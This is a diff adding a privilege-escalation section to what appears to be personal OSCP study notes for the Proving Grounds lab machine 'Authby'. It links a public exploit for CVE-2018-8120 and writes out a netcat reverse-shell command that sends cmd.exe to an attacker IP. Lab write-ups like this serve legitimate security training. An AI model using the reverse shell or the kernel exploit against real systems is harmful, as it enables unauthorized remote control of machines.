@@ -185,3 +185,16 @@ Check the privileges.
 
 ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_15h40m27s_013_.png)
 
+#### Privilege Escalation
+
+The target pc runs an old version os and no patched, so we can try to exploit kernel vulnerabilities.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_15h59m42s_014_.png)
+
+After searching for a while I found the vulnerability [CVE-2018-8120](https://github.com/unamer/CVE-2018-8120) working.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_16h25m38s_015_.png)
+
+We upload x86 version execution file and execute the netcat command ```nc.exe -e cmd.exe 192.168.49.73 3145```.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_16h41m21s_016_.png)
